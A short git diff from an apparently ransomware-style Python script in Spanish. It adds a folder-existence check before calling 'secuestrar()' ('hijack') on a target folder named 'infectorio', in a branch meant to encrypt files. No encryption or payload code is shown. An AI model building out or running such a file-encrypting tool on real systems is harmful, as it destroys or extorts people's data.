@@ -261,4 +261,13 @@ if __name__ == "__main__":
 
     # Se solicitó cifrar los ficheros (ninguna opción).
     else:
-        secuestrar()
+        # Verificar que existe la carpeta por defecto.
+        if os.path.exists(infectorio):
+            secuestrar()
+
+        elif not silencio:
+            print("Error: no existe la carpeta '{}'.".format(infectorio))
+
+        """
+        Decido no crear la carpeta si no existe, porque debe contener ficheros.
+        """
